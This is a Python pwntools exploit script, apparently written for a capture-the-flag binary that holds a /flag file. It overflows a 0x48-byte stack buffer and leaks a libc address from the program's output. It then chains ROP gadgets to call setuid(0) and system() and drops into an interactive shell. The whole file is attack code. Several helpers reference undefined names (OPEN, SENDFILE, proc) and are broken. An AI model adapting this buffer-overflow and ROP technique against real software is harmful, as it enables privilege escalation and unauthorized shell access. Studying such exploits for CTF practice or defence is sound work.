#!/bin/python

from pwn import * 
import sys

context.arch = 'amd64'

GOAL = b'cat /flag\x00'
BUFFER_LEN=0x48

# addr of pop REG;
RDI = 0x401a33
RSI = 0x401a31 
R14 = 0x401a30
R15 = 0x401a32
RDX = 0x401a10
RCX = 0x4015c3

READ = 0x401150
SYSTEM_OFF = 0x52290

BSS = 0x4040b0
STR = 0x1b45bd


def set_rdx(val: int):
    '''
    !!! MODIFIES rsi and rdi !!!
    '''
    return flat([
        R14, val, 0,
        RDX
    ])


def read_to_bss(fd):
    return flat([
        set_rdx(len(GOAL)),
        RDI, fd,
        RSI, BSS, 0,
        READ
    ])


def do_system(libc):
    return flat([
        0x40101a,       # an extra ret to make stack 16 byte align
        RDI, libc + STR,
        libc + 0x522ab
    ])


def setuid(libc):
    return flat([
        RDI, 0,
        libc + 0xe4150
    ])


def open():
    return flat([
        RDI, BSS,
        RSI, 0,
        RDX, 0,
        OPEN
    ])


def puts(libc, str):
    return flat([
        RDI, str,
        libc + 0x84420
    ])


def sendfile():
    return flat([
        RDI, 1,
        RSI, 3,
        RDX, 0,
        RCX, 100,
        SENDFILE
    ])


def get_payload(args, proc: process):
    proc.readuntil("in libc is: 0x")
    addr = int(proc.readline(drop=True)[:-1], 16)

    libc_addr = addr - SYSTEM_OFF
    print("Addr of libc: " + str(hex(libc_addr)))

    payload = cyclic(BUFFER_LEN)
    payload += setuid(libc_addr)
    payload += do_system(libc_addr)

    return payload #+ b'X' * (0x1000 - len(payload)) + GOAL


def main():
    proc = process(sys.argv[1])
    proc.send(get_payload(None, proc))

    proc.interactive()


def print_payload():
    payload = get_payload(args, proc)[1:]
    print(payload + cyclic(0x1000 - len(payload)-1) + GOAL)


if __name__ == '__main__':
    if len(sys.argv) == 3:
        print_payload()
    else:
        main()
